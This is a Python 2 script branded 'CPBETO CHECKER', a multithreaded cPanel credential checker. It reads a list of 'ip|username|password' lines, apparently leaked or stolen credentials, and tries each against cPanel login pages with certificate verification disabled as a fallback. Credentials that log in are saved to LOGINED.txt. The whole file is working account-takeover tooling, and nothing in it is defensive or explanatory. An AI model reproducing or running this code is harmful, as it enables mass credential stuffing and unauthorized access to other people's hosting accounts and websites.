import sys
import requests
import ctypes
import os
from multiprocessing.pool import ThreadPool
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from time import time as timer
from colorama import Fore
from colorama import Style
from pprint import pprint
from colorama import init
init(autoreset=True)

fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
fm  =   Fore.MAGENTA

Done = 0
Failed = 0

logo = '''
.______    _______ .___________.  ______        ______ .______  
|   _  \  |   ____||           | /  __  \      /      ||   _  \ 
|  |_)  | |  |__   `---|  |----`|  |  |  |    |  ,----'|  |_)  |
|   _  <  |   __|      |  |     |  |  |  |    |  |     |   ___/ 
|  |_)  | |  |____     |  |     |  `--'  |    |  `----.|  |     
|______/  |_______|    |__|      \______/      \______|| _|     
                                                                

'''

print logo
CPBETO = raw_input(' [+] CPANEL PATH [+]   ')
BETOTHRE = int(raw_input(' [+] ThreadPool NUM [+]   '))

def CPCHEK(datacPanel):
	global Done, Failed
	try :
			ip, username, password = datacPanel.split('|')
			req = requests.session()
			postlogin = {'user':username,'pass':password,'login_submit':'Log in'}
			try :
				login = req.post(ip+'/login/', data=postlogin,timeout=15)
			except:
				login = req.post(ip + '/login/',verify=False, data=postlogin, timeout=15)
			if 'filemanager' in login.content :
				print ' {}[+] Login successful'.format(fg)
				Done += 1
				os.system("title " + "[+] CPBETO CHECKER .. [Done : {}] [Failed : {}]".format(Done, Failed))
				print '{}'.format(datacPanel)
				open('LOGINED.txt', 'a').write('{}\n'.format(datacPanel))
			else:
				print ' {} {} [-] Login failed'.format(fr, datacPanel)
				Failed += 1
				os.system("title " + "[+] CPBETO CHECKER .. [Done : {}] [Failed : {}]".format(Done, Failed))
	except:
		print ' {} {} [-] Login failed'.format(fr, datacPanel)
		Failed += 1
		os.system("title " + "[+] CPBETO CHECKER .. [Done : {}] [Failed : {}]".format(Done, Failed))
if __name__ == "__main__":
	CPBETO = open(CPBETO, 'r').read().split('\n')
	pool = ThreadPool(BETOTHRE)
	for _ in pool.imap_unordered(CPCHEK, CPBETO):
		pass
		